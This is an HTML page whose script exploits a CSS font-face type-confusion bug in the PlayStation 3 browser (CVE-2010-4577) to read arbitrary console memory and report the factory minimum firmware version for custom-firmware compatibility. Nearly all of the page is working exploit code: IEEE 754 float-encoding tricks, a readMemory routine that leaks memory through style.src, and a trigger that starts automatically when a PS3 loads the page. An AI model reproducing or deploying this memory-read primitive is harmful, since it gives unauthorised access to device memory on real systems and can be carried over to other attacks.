<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS3 Factory Minimum Firmware Detector (Memory Leak)</title>
    <style>
        body { background: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        .box { background: #222; border-left: 5px solid #dc3545; padding: 20px; display: inline-block; max-width: 650px; }
        h1 { color: #dc3545; }
        #status { color: #f79452; margin: 20px 0; }
        #result { font-weight: bold; font-size: 1.2em; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Factory Minimum Firmware Version Detector</h1>
        <div id="status">Initialising memory leak exploit...</div>
        <div id="result"></div>
        <p style="color:#aaa; font-size:0.9em;">Uses CSS font face type confusion (CVE-2010-4577) memory leak.<br>Works on PS3 OFW 4.75–4.92 and HFW.</p>
    </div>

    <!-- Hidden exploit element for CSS memory leak -->
    <div id="exploit" style="display:none;"></div>

    <script>
    // ==================== MEMORY LEAK EXPLOIT (CSS Font Face Type Confusion) ====================
    // Based on Zerosense MemoryReader.js by GHzGangster
    // Exploit: CVE-2010-4577 – CSSParser::parseFontFaceSrc type confusion

    var exploitElement = document.getElementById('exploit');
    var statusElement = document.getElementById('status');
    var resultElement = document.getElementById('result');

    // IEEE 754 double-precision conversion (required for the float overflow trick)
    Number.prototype.noExponents = function() {
        var data = String(this).split(/[eE]/);
        if (data.length === 1) return data[0];
        var z = '', sign = this < 0 ? '-' : '',
            str = data[0].replace('.', ''),
            mag = Number(data[1]) + 1;
        if (mag < 0) { z = sign + '0.'; while (mag++) z += '0'; return z + str.replace(/^\-/, ''); }
        mag -= str.length;
        while (mag--) z += '0';
        return str + z;
    };

    function fromIEEE754(bytes, ebits, fbits) {
        var retNumber = 0;
        var bits = [];
        for (var i = bytes.length; i; i -= 1) {
            var byte = bytes[i - 1];
            for (var j = 8; j; j -= 1) {
                bits.push(byte % 2 ? 1 : 0);
                byte = byte >> 1;
            }
        }
        bits.reverse();
        var str = bits.join('');
        var bias = (1 << (ebits - 1)) - 1;
        var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
        var e = parseInt(str.substring(1, 1 + ebits), 2);
        var f = parseInt(str.substring(1 + ebits), 2);
        if (e === (1 << ebits) - 1) { retNumber = f !== 0 ? NaN : s * Infinity; }
        else if (e > 0) { retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits)); }
        else if (f !== 0) { retNumber = s * Math.pow(2, -(bias - 1)) * (f / Math.pow(2, fbits)); }
        else { retNumber = s * 0; }
        return retNumber.noExponents();
    }

    function generateIEEE754(address, size) {
        var hex = [
            (address >> 24) & 0xFF, (address >> 16) & 0xFF, (address >> 8) & 0xFF, address & 0xFF,
            (size >> 24) & 0xFF, (size >> 16) & 0xFF, (size >> 8) & 0xFF, size & 0xFF
        ];
        return fromIEEE754(hex, 11, 52);
    }

    // Convert address and size to the double that triggers the CSS font face type confusion
    function floatOverflow(address, size) {
        var n = (address * 0x100000000) + ((size >> 1) - 1);
        return generateIEEE754(address, (n - address));
    }

    // Read arbitrary PS3 memory using the CSS font face type confusion
    function readMemory(address, size) {
        if (!exploitElement) return null;

        var readAddress = address;
        var readSize = size + 4;
        var alignment = null;

        // Find appropriate alignment
        for (var align = 0x400; align <= 0x20000; align *= 2) {
            var maxRead = align * 2;
            var rem = readAddress % align;
            var requiredRead = readSize + rem;
            if (maxRead > requiredRead) {
                alignment = align;
                break;
            }
        }

        if (alignment === null) {
            statusElement.innerHTML = 'Error: Could not get required alignment';
            return null;
        }

        var rem = readAddress % alignment;
        if (rem !== 0) { readAddress -= rem; }
        readSize = alignment * 2;

        // Trigger the CSS font face type confusion
        exploitElement.style.src = 'local(' + floatOverflow(readAddress, readSize) + ')';

        // Extract the leaked data
        var str = exploitElement.style.src.substr(6 + (address - readAddress) / 2, size / 2);

        if (str === null || str.length < size / 2) {
            statusElement.innerHTML = 'Memory read failed – may not be on a compatible PS3';
            return null;
        }

        return str;
    }

    // Convert binary string to hex representation
    function s2hex(str) {
        var hex = [];
        for (var i = 0; i < str.length; i++) {
            hex.push(('0000' + str.charCodeAt(i).toString(16)).slice(-4));
        }
        return hex.join('');
    }

    // Read factory minimum firmware from PS3 flash memory
    function readFactoryMinVer() {
        statusElement.innerHTML = 'Reading factory minimum firmware from 0x8B000000...';

        // The factory minimum firmware is stored at 0x8B000000 - 0x8
        // Read 0x100 bytes and extract the version
        var raw = readMemory(0x8B000000 - 0x8, 0x100);

        if (!raw) {
            statusElement.innerHTML = 'Memory read failed. Your firmware may not support this exploit.';
            return;
        }

        // Extract the version (same logic as Flash Writer's minVer())
        var minver = s2hex(raw).toString().slice(3, 8).replace('00', '.');

        if (parseFloat(minver) > 3.56) {
            resultElement.innerHTML = '<span style="color:red">Factory Minimum Firmware: ' + minver + ' (NOT CFW compatible)</span>';
        } else {
            resultElement.innerHTML = '<span style="color:lightgreen">Factory Minimum Firmware: ' + minver + ' (CFW compatible)</span>';
        }

        statusElement.innerHTML = 'Detection complete.';
    }

    // Auto-start when page loads
    window.onload = function() {
        var ua = navigator.userAgent;
        var isPS3 = ua.indexOf('PLAYSTATION 3') !== -1;

        if (!isPS3) {
            statusElement.innerHTML = 'Not on a PS3. This exploit only works on a real PlayStation 3.';
            return;
        }

        // Brief delay to ensure the page is fully loaded
        setTimeout(readFactoryMinVer, 1000);
    };
    </script>
</body>
</html>
